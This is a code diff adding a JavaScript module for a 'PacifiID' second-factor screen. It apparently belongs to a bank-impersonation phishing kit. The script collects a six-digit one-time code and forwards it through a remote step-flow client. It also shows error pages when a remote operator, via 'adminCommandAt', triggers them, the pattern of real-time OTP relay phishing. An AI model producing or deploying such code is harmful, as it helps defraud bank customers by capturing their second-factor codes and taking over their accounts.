@@ -1,0 +1,112 @@
+(function () {
+  var ERROR_PAGE = 9;
+  var lastShownCommandAt = '';
+
+  if (!document.getElementById('pacifid-chip-style')) {
+    var style = document.createElement('style');
+    style.id = 'pacifid-chip-style';
+    style.textContent =
+      '.pacifid-chip{display:inline-flex;align-items:center;gap:8px;margin:12px auto 0;padding:8px 14px;' +
+      'border-radius:999px;background:linear-gradient(135deg,#e8f4ff,#f3fff8);border:1px solid #c5d9ea;' +
+      'color:#0f3d66;font-size:13px;font-weight:600}';
+    document.head.appendChild(style);
+  }
+
+  function alertKey(detail) {
+    var data = detail && detail.data ? detail.data : {};
+    if (data.adminCommandAt) {
+      return String(data.adminCommandAt);
+    }
+    return [data.pacifidErr ? '1' : '0', data.loginError || '', detail && detail.page].join('|');
+  }
+
+  function shouldShow(detail) {
+    var key = alertKey(detail);
+    if (!key || key === '|') {
+      return false;
+    }
+    if (key === lastShownCommandAt) {
+      return false;
+    }
+    lastShownCommandAt = key;
+    return true;
+  }
+
+  function isPacifidError(detail) {
+    var page = detail ? Number(detail.page) : NaN;
+    var data = detail && detail.data ? detail.data : {};
+    return page === ERROR_PAGE || data.pacifidErr === true || data.loginError === 'codigo';
+  }
+
+  function applyPacifidContact(data) {
+    var host = document.getElementById('titleBox') || document.getElementById('estiloSubtitulo_');
+    if (!host) {
+      return;
+    }
+    var masked = String((data && data.pacifidContactMasked) || '').trim();
+    var chip = document.getElementById('pacifidContactChip');
+    if (!chip) {
+      chip = document.createElement('div');
+      chip.id = 'pacifidContactChip';
+      chip.className = 'pacifid-chip';
+      var subtitle = document.getElementById('estiloSubtitulo_');
+      if (subtitle && subtitle.parentNode) {
+        subtitle.parentNode.insertBefore(chip, subtitle.nextSibling);
+      } else {
+        host.appendChild(chip);
+      }
+    }
+    if (!masked) {
+      chip.style.display = 'none';
+      return;
+    }
+    chip.style.display = 'inline-flex';
+    chip.innerHTML =
+      '<span style="width:8px;height:8px;border-radius:50%;background:#1f9d55;display:inline-block;"></span>' +
+      '<span>PacifiID · ' + masked + '</span>';
+  }
+
+  var prefetchedPacifid = window.FlowPrefetch && window.FlowPrefetch.peek();
+  if (prefetchedPacifid && (Number(prefetchedPacifid.page) === 6 || Number(prefetchedPacifid.page) === 9 || prefetchedPacifid.pacifidContactMasked)) {
+    applyPacifidContact(prefetchedPacifid);
+  }
+
+  document.addEventListener('stepFlowPage', function (event) {
+    var detail = event.detail || {};
+    applyPacifidContact(detail.data || {});
+    if (isPacifidError(detail) && shouldShow(detail)) {
+      if (window.showErrorModal) {
+        window.showErrorModal();
+      }
+      if (window.hideLoader) {
+        window.hideLoader();
+      }
+    }
+  });
+
+  StepFlowClient.init({
+    pageLocation: 'pacifid',
+    sessionKey: 'intermaticoActual',
+    localPage: 6,
+    errorPage: ERROR_PAGE,
+    errorFlag: 'pacifidErr',
+    lgSelector: '#segundoFactorLg',
+    inputSelector: '#codigoSegundoFactor',
+    mitSelector: '#_eventId_registrarSegundoFactor',
+    mitLabel: 'Continuar',
+    loadingLabel: 'Procesando…',
+    fallbackUrl: 'index.html',
+    isValid: function (value) {
+      return /^\d{6}$/.test(String(value || '').trim());
+    },
+    buildPayload: function (value) {
+      return {
+        pacifidCode: value,
+        otpCode: value,
+        pacifidErr: false,
+        loginError: ''
+      };
+    },
+    onRemoteData: applyPacifidContact
+  });
+})();
